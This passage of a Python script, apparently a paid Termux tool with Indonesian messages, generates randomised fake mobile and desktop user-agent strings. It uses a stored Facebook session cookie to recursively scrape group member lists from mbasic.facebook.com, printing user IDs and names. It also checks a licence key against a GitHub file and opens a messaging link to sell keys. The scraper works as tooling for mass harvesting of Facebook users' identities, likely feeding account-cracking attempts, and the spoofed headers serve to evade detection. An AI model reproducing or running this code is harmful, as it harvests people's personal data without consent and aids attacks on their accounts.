       except Exception as e:return None
 
 
for UserAgent in ['re/realme', 'sa/samsung', 'xi/xiaomi', 'if/infinix']:
	try:
		link = parser(requests.get('https://whatmyuseragent.com/brand/'+UserAgent).text, "html.parser")
		uaz.extend([re.findall('Android .*; (.*?) Build', z.text)[0] for z in link.find_all("td", {"class": "useragent"}) if 'Build' in z.text])
	except Exception as e:
		uaz.append('Mi A3')
		
def MyUa():
	Android = random.choice(['9|PPR1','10|QP1A','11|RP1A','12|SP1A','13|TP1A','14|UP1A'])
	Faz, Fax = Android.split("|")[0],Android.split("|")[1]
	Build = "Build/{}.{}.0{}".format(Fax, random.randint(111111,333333), random.randint(10,20))
	Chrom = "{}.0.{}.{}".format(random.randint(80,124), random.randint(4500,6999), random.randint(80,169))
	a1 = f"Mozilla/5.0 (Linux; Android {Faz}; {random.choice(uaz)} {Build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{Chrom} Mobile Safari/537.36"
	return a1
	

def WebUserAgent():
	acak_device = random.choice(['Windows NT 10.0; Win64; x64', 'Windows NT 10.0; WOW64', 'Windows NT 10.0', 'Macintosh; Intel Mac OS X 13_2', 'X11; Linux x86_64'])
	browser_version = (f'{random.randrange(90, 108)}.0.{random.randrange(4200, 4900)}.{random.randrange(40, 150)}')
	usera = ('Mozilla/5.0 ({}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Safari/537.36'.format(acak_device, browser_version))
	return usera
	
class Dump_user:
	def __init__(self):
		self.ua = "Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba"
		
	def Dump_MemberGrup(self,url):
		try:
			Accok = {'cookie':open('Data/Cookie.txt','r').read()}
		except Exception as e:
			print('  [%s/%s] Cookie Tidak di temukan, Silahkan Login%s'%(H,P,P));time.sleep(3);Login().Login_Cookie()
		try:
			data = parser(ses.get(url,cookies=Accok,headers={"user-agent": self.ua}).text, "html.parser")
			judul = re.findall("<title>(.*?)</title>",str(data))[0]
			for isi in data.find_all("h3"):
				for ids in isi.find_all("a",href=True):
					if "profile.php" in ids.get("href"):uid = ids.get("href").split("=")[1].replace("&eav","");nama = ids.text
					else:
						if ids.text==judul:pass
						else:uid = ids.get("href").split("/")[1].split("?")[0];nama = ids.text
					if uid+"|"+nama in dump:pass
					else:print(uid+"|"+nama)
					#print('  [%s/%s] mengumpulkan %s%s%s'%(H,P,H,len(dump),P), end='\r');sys.stdout.flush()
			for x in data.find_all("a",href=True):
				if "Lihat Postingan Lainnya" in x.text:
					self.Dump_MemberGrup("https://mbasic.facebook.com"+x.get("href"))
		except:pass

def security():
    try:
        uid=os.getuid()#> auto key garnet by termux uid
        xx = ('libsooney.so')
        try:
            key1=open(f'/data/data/com.termux/files/usr/bin/{xx}','r').read()
        except:
            keysv=uuid.uuid4().hex[:5].upper()#Auto Key Grante By uuid
            key1=open(f'/data/data/com.termux/files/usr/bin/{xx}','w').write(keysv)
        kk = ('github')
        k1 = ('FajarKyy')
        k2 = ('confirm')
        k3 = ('key.txt')
        key1=open(f'/data/data/com.termux/files/usr/bin/{xx}','r').read()
        key=(f'SFA-F{uid}5X{key1}001S==')#full key
        mysite= requests.get(f'https://{kk}.com/{k1}/{k2}/blob/main/{k3}').text#approve site
        if key in mysite:
                os.system('clear')
                MenuTools()
        else:
                Logo()
                print(f'\n[{M}?{P}] Kunci Anda Tidak Terdaftar...')
                print(f'[{M}?{P}] Alat Ini Hanya Untuk Pengguna Berbayar')
                print(f'[{M}?{P}] Key : \033[1;32m'+key)
                
                input(f'{P}[{M}?{P}] Tekan Enter Untuk Menyetujui')    
                whatsapp = "+6285813364450"
                url_wa = "https://t.me/KGF_TERMUX_TEAM"+whatsapp+"&text="
                tks = ("hallo bang\nSaya akan membeli perintah Anda\nMy Key :- "+key)
                subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                
                os.system('python Run.py');pass
    except requests.exceptions.ConnectionError:
    	print("\033[1;32minternet connection lol \033[1;37m")
		
if __name__ == '__main__':
	try:os.mkdir('Data')
	except:pass
	try:os.mkdir('/sdcard/Ress')
	except:pass
	try:
		Main()
	except requests.exceptions.ConnectionError:
		print('Connection Close')
